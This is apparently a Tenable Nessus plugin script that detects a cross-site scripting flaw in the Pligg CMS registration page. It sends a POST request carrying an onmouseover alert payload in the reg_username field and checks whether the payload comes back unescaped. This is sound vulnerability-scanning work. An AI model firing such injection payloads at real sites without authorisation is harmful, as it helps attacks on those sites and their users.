#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(51438);
  script_version("$Revision: 1.8 $");
  script_cvs_date("$Date: 2015/09/24 23:21:19 $");

  script_osvdb_id(70164);
  script_xref(name:"Secunia", value:"42740");

  script_name(english:"Pligg register.php reg_username Parameter XSS");
  script_summary(english:"Attempts to exploit an XSS flaw in the reg_username parameter of Pligg");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server hosts a web application that is vulnerable to a
cross-site scripting attack."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The remote web server is hosting a version of Pligg that is affected
by a cross-site scripting vulnerability in the 'reg_username'
parameter of the 'register.php' script.

Also note it has been reported that several other cross-site scripting
vulnerabilities exist in the script 'register.php' via the parameters
'reg_email', 'reg_password', and 'reg_password2', although Nessus has
not checked for them."
  );
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?6e396247");
  script_set_attribute(attribute:"solution", value:"Upgrade to version 1.1.3 or greater.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/12/23");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/12/23");
  script_set_attribute(attribute:"plugin_publication_date", value:"2011/01/07");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:pligg:pligg_cms");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");

  script_copyright(english:"This script is Copyright (C) 2011-2015 Tenable Network Security, Inc.");

  script_dependencie("pligg_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/pligg");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");

port = get_http_port(default:80, php:TRUE);

install = get_install_from_kb(appname:'pligg', port:port, exit_on_fail:TRUE);
timestamp = unixtime();

xss = '"onmouseover=alert(/'+SCRIPT_NAME + '-' + timestamp +'/)>';
post_data = 'reg_username='
  + xss
  + '&reg_email=fakeemail&reg_password=fakepasswd&reg_password2=fakepasswd'
  + '&recaptcha_challenge_field=junk&recaptcha_response_field=junk'
  + '&submit=Create+user&regfrom=full';

expected_output = 'name="reg_username" id="reg_username" value="\\"'
  + 'onmouseover=alert(/'
  + SCRIPT_NAME + '-' + timestamp
  + '/)>" size="25"';

w = http_send_recv3(
  method       : "POST",
  item         : install['dir'] + "/register.php",
  data         : post_data,
  content_type : 'application/x-www-form-urlencoded',
  port         : port,
  exit_on_fail : TRUE
);

if (expected_output >< w[2])
{
  set_kb_item(name:'www/'+port+'/XSS', value:TRUE);

  if(report_verbosity > 0)
  {
    report =
      '\n' + 'Nessus was able to verify the issue with the following request : ' +
      '\n' +
      '\n  ' + str_replace(find:'\n', replace:'\n  ', string: http_last_sent_request()) + '\n';
      security_warning(port:port, extra:report);
  }
  else security_warning(port:port);
  exit(0);
}
else exit(0, "The Pligg install at " + install['dir']  + " is not affected.");
